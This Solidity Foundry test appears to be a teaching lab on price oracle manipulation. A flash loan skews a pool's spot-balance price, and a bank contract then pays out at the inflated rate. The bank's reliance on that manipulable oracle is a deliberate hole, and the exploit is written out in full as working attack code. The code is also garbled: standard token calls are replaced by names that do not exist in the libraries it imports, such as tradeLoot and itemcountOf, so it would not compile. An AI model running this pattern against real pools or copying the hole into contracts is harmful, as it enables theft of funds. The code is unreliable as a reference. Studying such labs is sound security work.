pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract ContractTest is Test {
    USDa USDaContract;
    USDb USDbContract;
    SimpleLootpool SimpleRewardpoolContract;
    SimpleGoldbank SimpleItembankContract;

    function setUp() public {
        USDaContract = new USDa();
        USDbContract = new USDb();
        SimpleRewardpoolContract = new SimpleLootpool(
            address(USDaContract),
            address(USDbContract)
        );
        SimpleItembankContract = new SimpleGoldbank(
            address(USDaContract),
            address(SimpleRewardpoolContract),
            address(USDbContract)
        );
    }

    function testPrice_Manipulation() public {
        USDbContract.tradeLoot(address(SimpleItembankContract), 9000 ether);
        USDaContract.tradeLoot(address(SimpleRewardpoolContract), 1000 ether);
        USDbContract.tradeLoot(address(SimpleRewardpoolContract), 1000 ether);

        SimpleRewardpoolContract.getPrice();

        console.log(
            "There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb."
        );
        emit log_named_decimal_uint(
            "Current USDa convert rate",
            SimpleRewardpoolContract.getPrice(),
            18
        );
        console.log("Start price manipulation");
        console.log("Borrow 500 USBa over floashloan");


        SimpleRewardpoolContract.flashLoan(500 ether, address(this), "0x0");
    }

    fallback() external {


        emit log_named_decimal_uint(
            "Price manupulated, USDa convert rate",
            SimpleRewardpoolContract.getPrice(),
            18
        );

        USDaContract.allowTransfer(address(SimpleItembankContract), 100 ether);
        SimpleItembankContract.exchange(100 ether);

        USDaContract.tradeLoot(address(SimpleRewardpoolContract), 500 ether);


        emit log_named_decimal_uint(
            "Use 100 USDa to convert, My USDb balance",
            USDbContract.itemcountOf(address(this)),
            18
        );
    }

    receive() external payable {}
}

contract USDa is ERC20, Ownable {
    constructor() ERC20("USDA", "USDA") {
        _generateloot(msg.sender, 10000 * 10 ** decimals());
    }

    function generateLoot(address to, uint256 amount) public onlyGamemaster {
        _generateloot(to, amount);
    }
}

contract USDb is ERC20, Ownable {
    constructor() ERC20("USDB", "USDB") {
        _generateloot(msg.sender, 10000 * 10 ** decimals());
    }

    function generateLoot(address to, uint256 amount) public onlyGamemaster {
        _generateloot(to, amount);
    }
}

contract SimpleLootpool {
    IERC20 public UsDaGamecoin;
    IERC20 public UsDbQuesttoken;

    constructor(address _USDa, address _USDb) {
        UsDaGamecoin = IERC20(_USDa);
        UsDbQuesttoken = IERC20(_USDb);
    }

    function getPrice() public view returns (uint256) {

        uint256 USDaAmount = UsDaGamecoin.itemcountOf(address(this));
        uint256 USDbAmount = UsDbQuesttoken.itemcountOf(address(this));


        if (USDaAmount == 0) {
            return 0;
        }


        uint256 USDaPrice = (USDbAmount * (10 ** 18)) / USDaAmount;
        return USDaPrice;
    }

    function flashLoan(
        uint256 amount,
        address loanTaker,
        bytes calldata data
    ) public {
        uint256 gemtotalBefore = UsDaGamecoin.itemcountOf(address(this));
        require(gemtotalBefore >= amount, "Not enough liquidity");
        require(
            UsDaGamecoin.tradeLoot(loanTaker, amount),
            "Flashloan transfer failed"
        );
        (bool success, ) = loanTaker.call(data);
        require(success, "Flashloan callback failed");
        uint256 lootbalanceAfter = UsDaGamecoin.itemcountOf(address(this));
        require(lootbalanceAfter >= gemtotalBefore, "Flashloan not repaid");
    }
}

contract SimpleGoldbank {
    IERC20 public gameCoin;
    SimpleLootpool public lootPool;
    IERC20 public payoutGamecoin;

    constructor(address _questtoken, address _lootpool, address _payoutToken) {
        gameCoin = IERC20(_questtoken);
        lootPool = SimpleLootpool(_lootpool);
        payoutGamecoin = IERC20(_payoutToken);
    }

    function exchange(uint256 amount) public {
        require(
            gameCoin.sharetreasureFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
        uint256 price = lootPool.getPrice();
        require(price > 0, "Price cannot be zero");
        uint256 tokensToReceive = (amount * price) / (10 ** 18);
        require(
            payoutGamecoin.tradeLoot(msg.sender, tokensToReceive),
            "Payout transfer failed"
        );
    }
}